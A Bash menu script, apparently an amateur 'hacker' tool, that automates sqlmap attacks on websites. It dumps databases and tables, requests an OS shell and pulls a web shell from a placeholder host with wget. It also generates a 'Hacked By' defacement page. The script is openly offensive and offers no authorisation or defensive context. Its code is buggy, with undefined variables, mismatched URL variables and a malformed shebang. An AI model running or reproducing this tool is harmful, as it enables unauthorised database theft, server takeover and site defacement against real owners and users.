#!bin/bash
clear
red='\e[1;31m'
green='\e[1;32m'
blue='\e[1;34m'
purple='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'
yellow='\e[1;33m'
De='"'
a='"center"'
aaa='"#111111"'
b='"100%"'
bb='""'
c='"0"'
d='"align"'
e='"#000000"'
f='"10"'
gg='"1"'
h='"#ffffff"'
hh='"#b21f25"'
hhh='"#333333"'
#figlet "Logen [~]"

#echo -e $yellow "please insert the 
#password login "
#read -p "insert :>" welcome
#if [ $welcome = "123456" ]
#then
clear
echo ''
echo ''
#toilet -f term -F border --gay "fb : www.fb.com/profionaldhim"
echo -e $green '+--------------------------------------------------------+'
echo -e $red '+                                                        +'
figlet -f smmono12 "F-Inj Sqlmap"
echo -e $white '+                                                        +'
echo -e $yellow '+        Hacker \ Mohammed Info                          +'
echo -e $red '+          ///,        ////                              +'
echo -e $white '+          \  /,      /  >.                              +'
echo -e $green '+           \  /,   _/  /.                               +'
echo -e $red '+            \_  /_/   /.                                +'
echo -e $yellow '+             \__/_   <    F.Injection                   +'
echo -e $white '+              /<<< \_\_      Yemen                      +' 
echo -e $green '+             /,)^>>_._ \                                +'
echo -e $red '+             (/   \\ /\\\                                 +'
echo -e $white '+                   // ````                              +'
echo -e $red '+           ======((`=======                             +'
echo -e $green '---------------------------------------------------------+'
echo -e $green '      ┏┫ github.com/profionaldhim ┣┓'
echo -e $red   '      ╚ ═══ ══ ══ ═══ ══ ══  ══ ══ ╝'
echo -e $green '      ╚═┫whatsapp :+967733014747╠═╝'
echo ""
echo -e $yellow "    By =====> $red HACKER / MOHAMMED Info "
echo ''
echo -e $green   "        {-1-} Injection Sqlmap"
echo ""
echo -e $green   "        {-2-} Install SqlMap"
echo ""
echo -e $green   "        {-3-} Creat Index"
echo ""
echo -e $green   "        {-4-} About me"
echo ""
echo -e $green   "        {-0-} EXIT |-|"
echo ""
echo ""
echo -e $green "Enter The Number:"
echo -e $red
echo ""
#################################

read -p "insert :>" name
if [ $name = 1 ]
then
clear
echo ''
echo ''-e $green '+--------------------------------------------------------+'
echo -e $red '+                                                        +'
figlet -f smmono12 "F-Inj Sqlmap"
echo -e $white '+                                                        +'
echo -e $yellow '+        Hacker \ Mohammed Info                          +'
echo -e $red '+          ///,        ////                              +'
echo -e $white '+          \  /,      /  >.                              +'
echo -e $green '+           \  /,   _/  /.                               +'
echo -e $red '+            \_  /_/   /.                                +'
echo -e $yellow '+             \__/_   <    F.Injection                   +'
echo -e $white '+              /<<< \_\_      Yemen                      +'
echo -e $green '+             /,)^>>_._ \                                +'
echo -e $red '+             (/   \\ /\\\                                 +'
echo -e $white '+                   // ````                              +'
echo -e $red '+           ======((`=======                             +'
echo -e $green '---------------------------------------------------------+'
echo -e $green '      ┏┫ github.com/profionaldhim ┣┓'
echo -e $red   '      ╚ ═══ ══ ══ ══  ══ ══ ══  ══ ╝'
echo -e $green '      ╚═┫whatsapp :+967733014747╠═╝'
echo ""
echo ""
echo -e $yellow "    By =====> $red HACKER / MOHAMMED Info "
echo ''
cd ~
cd sqlmap
echo ""
echo -e $greeb "Do you want Fast Injection insert y or n?"
read -p "insert :>" fast
if [ $fast = "y" ]
then

echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ please insert web url +'
echo -e $red '++++++++++++++++++++++'
read -p "insert :>" urr
echo ""
echo ""

python2 sqlmap.py -u $urr --batch

echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $greeng '| the root |'python2 sqlmap.py -u $urr --current-user --is-dba '|'
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'


python2 sqlmap.py -u $urr --os-shell


wget http://www.site.com/shell.txt -o shell.php

else
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ please insert web url +'
echo -e $red '+++++++++++++++++++++++++'
read -p "insert :>" re
python2 sqlmap.py -u $re --dbs
echo -e $green '-----------------------------------------------------------------'
echo -e $white '+  URL WEBSITE                     +   Database +  Table        +'
echo -e $white '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'   
echo -e $white '+                                  +            +               +'
echo -e $white '+'$re' + ' '   + ''     +'
echo -e $white '+---------------------------------------------------------------+'
echo ""
echo -e $yellow '++++++++++++++++++++++++++++++'
echo -e $green '+ please insert web Database +'
echo -e $red '++++++++++++++++++++++++++++++'
read -p "insert :>" data

python2 sqlmap.py -u $re -D $data --tables 
echo -e $green '-----------------------------------------------------------------'
echo -e $white '+  URL WEBSITE                     +   Database +  Table        +'
echo -e $white '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $white '+                                  +            +               +'
echo -e $white '+'$re' + '$data '   + ''     +'
echo -e $white '+---------------------------------------------------------------+'
echo ""
echo ""
echo -e $yellow '+++++++++++++++++++++++++++'
echo -e $green '+ please insert web Table +'
echo -e $red '+++++++++++++++++++++++++++'
read -p "insert :>" table
python2 sqlmap.py -u $re -D $data -T $table --columns
echo -e $green '-----------------------------------------------------------------'
echo -e $white '+  URL WEBSITE                     +   Database +  Table        +'
echo -e $white '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $white '+                                  +           +               +'
echo -e $white '+'$re' + '$data '   + '$table'     +'
echo -e $white '+---------------------------------------------------------------+'
echo ""
echo ""
echo -e $yellow '+++++++++++++++++++++++++++++'
echo -e $green '+ please insert web Columns +'
echo -e $red '+++++++++++++++++++++++++++++'
read -p "insert :>" columns
echo -e $green '------------------------------------------------------------------------------+'
echo -e $white '+  URL WEBSITE                     +   Database +  Table       + columns +'
echo -e $white '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $white '+                                  +            +               +'
echo -e $white '+'$re' + '$data '   + '$columns'   +'
echo -e $white '+-----------------------------------------------------------------------------+'
echo ""
python2 sqlmap.py -u $re -D $data -T $table -C $columns --dump
echo -e $yellow "Do you want extract shell path y/n "
read -p "insert :>" shell
if [ $shell = "y" ]
then
python2 sqlmap.py -u $urr --batch

echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $greeng '| the root |'python2 sqlmap.py -u $url --current-user                   '|'
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'


python2 sqlmap.py -u $url --os-shell


wget http://www.site.com/shell.txt -o shell.php
fi
echo -e $yellow "Do you want define type hash insert y/n "
read -p "insert :>" typehash
if [ $typehash = "y" ]
then
clear
cd $Home
cd hash-identifier.py
python2 hash-identifier.py

else
bash Fastinjection.sh
fi
fi
fi
if [ $name = 2 ]
then
clear
cd $Home
git clone https://github.com/sqlmapproject/sqlmap
fi
if [ $name = 3 ]
then
clear
echo ''
echo ''-e $green '+--------------------------------------------------------+'
echo -e $red '+                                                        +'
figlet -f smmono12 "F-Inj Sqlmap"
echo -e $white '+                                                        +'
echo -e $yellow '+        Hacker \ Mohammed Info                          +'
echo -e $red '+          ///,        ////                              +'
echo -e $white '+          \  /,      /  >.                              +'
echo -e $green '+           \  /,   _/  /.                               +'
echo -e $red '+            \_  /_/   /.                                +'
echo -e $yellow '+             \__/_   <    F.Injection                   +'
echo -e $white '+              /<<< \_\_      Yemen                      +'
echo -e $green '+             /,)^>>_._ \                                +'
echo -e $red '+             (/   \\ /\\\                                 +'
echo -e $white '+                   // ````                              +'
echo -e $red '+           ======((`=======                             +'
echo -e $green '---------------------------------------------------------+'
echo -e $green '      ┏┫ github.com/profionaldhim ┣┓'
echo -e $red   '      ╚ ═══ ══ ══ ══  ══ ══ ══  ══ ╝'
echo -e $green '      ╚═┫whatsapp :+967733014747╠═╝'
echo ""
echo ""
echo -e $yellow "    By =====> $red HACKER / MOHAMMED Info "
echo ''
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ please insert img url +'
echo -e $red '+++++++++++++++++++++++++'
read -p "insert :>" imgurl
echo ""
echo ""
echo -e $yellow '+++++++++++++++++++++++'
echo -e $green '+ please insert Title +'
echo -e $red '+++++++++++++++++++++++'
read -p "insert :>" title
echo ""
echo ""
echo -e $yellow '++++++++++++++++++++++++++++++'
echo -e $green '+ please insert Height image +'
echo -e $red '++++++++++++++++++++++++++++++'
read -p "insert :>" Height
echo ""
echo ""
echo -e $yellow '+++++++++++++++++++++++++++++'
echo -e $green '+ please insert Width image +'
echo -e $red '+++++++++++++++++++++++++++++'
read -p "insert :>" Width
echo ""
echo ""
echo -e $yellow '+++++++++++++++++++++++++++'
echo -e $green '+ please insert Hacked By +'
echo -e $red '+++++++++++++++++++++++++++'
read -p "insert :>" hacked
echo ""
echo ""
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ please insert MESSEGE +'
echo -e $red '+++++++++++++++++++++++++'
read -p "insert :>" messege
echo ""
echo ""
echo -e $yellow '++++++++++++++++++++++'
echo -e $green '+ please insert Team +'
echo -e $red '++++++++++++++++++++++'
read -p "insert :>" team
echo ""
echo ""
rm -rif output/index.html
touch output/index.html
echo "<body bgcolor=black>\n" >> output/index.html
echo "\n" >> output/index.html
echo "<br><title>"$title"</title></br>\n" >> output/index.html
echo "<td><div align="$a">\n" >> output/index.html
echo "</div>        <table width="$b" border="$c" cellpadding="$c" cellspacing="$c">\n" >> output/index.html
echo "          <tbody><tr>\n" >> output/index.html
echo "     <center><img src="$Dd""$imgurl""$Dd" alt="$bb" width="$aa""$Width""$aa" height="$aa""$Height""$aa" align="$d"></a></center>\n">> output/index.html
echo "          </tr>\n" >> output/index.html
echo "        </tbody></table>\n" >> output/index.html
echo "<table width="$b" bgcolor="$e" border="$c"cellpadding="$f" cellspacing="$gg">\n" >> output/index.html
echo "\n" >> output/index.html
echo "  <tbody><tr bgcolor="$h">\n" >> output/index.html
echo "    <td bgcolor="$h"><center><b><font color="$hh">Hacked By "$hacked"</font></b></center></td>\n" >> output/index.html
echo "\n" >> output/index.html
echo "  </tr>\n" >> output/index.html
echo "\n" >> output/index.html
echo "  <tr bgcolor="$hhh">\n" >> output/index.html
echo "    <td bgcolor="$aaa"><center><center><font color="$hh"><b><br>"$messege"</center>\n" >> output/index.html
echo "      <br><center>"$team"</b></center>\n" >> output/index.html
echo "\n" >> output/index.html
echo "\n" >> output/index.html
echo "   </td></tr><tr bgco" >> output/index.html
echo -e $yellow "Do you want cp index html to sdcard y/n "
read -p "insert :>" cindex
if [ $cindex = "y" ]
then
cp output/index.html /sdcard
bash Fastinjection.sh
fi

fi
if [ $name = 4 ]
then
clear
echo ''
echo ''-e $green '+--------------------------------------------------------+'
echo -e $red '+                                                        +'
figlet -f smmono12 "F-Inj Sqlmap"
echo -e $white '+                                                        +'
echo -e $yellow '+        Hacker \ Mohammed Info                          +'
echo -e $red '+          ///,        ////                              +'
echo -e $white '+          \  /,      /  >.                              +'
echo -e $green '+           \  /,   _/  /.                               +'
echo -e $red '+            \_  /_/   /.                                +'
echo -e $yellow '+             \__/_   <    F.Injection                   +'
echo -e $white '+              /<<< \_\_      Yemen                      +'
echo -e $green '+             /,)^>>_._ \                                +'
echo -e $red '+             (/   \\ /\\\                                 +'
echo -e $white '+                   // ````                              +'
echo -e $red '+           ======((`=======                             +'
echo -e $green '---------------------------------------------------------+'
echo -e $green '      ┏┫ github.com/profionaldhim ┣┓'
echo -e $red   '      ╚ ═══ ══ ══  ══ ══ ══  ══ ══ ╝'
echo -e $green '      ╚═┫whatsapp :+967733014747╠═╝'
echo ""
echo -e $yellow "    By =====> $red HACKER / MOHAMMED Info "
echo ''
echo -e $red   "                   About me"
echo ""
echo -e $green "            YOUTUBE: Mohammed Info "
echo ""
echo -e $green "               FB: profionaldhim "
echo ""
echo -e $green "            TWITTER: profionaldhim1 "
echo ""
echo -e $green "           Whatsapp: 00967733014747"
echo ""
echo -e $green "00- Back"
echo ""
read -p "insert :>" about
if [ $about = 00 ]
then
clear
bash Fastinjection.sh
fi
fi
if [ $name = 0 ]
then
clear
figlet "GOOD BYE"
exit
fi

figlet "GOOD BYE"

exit
fi
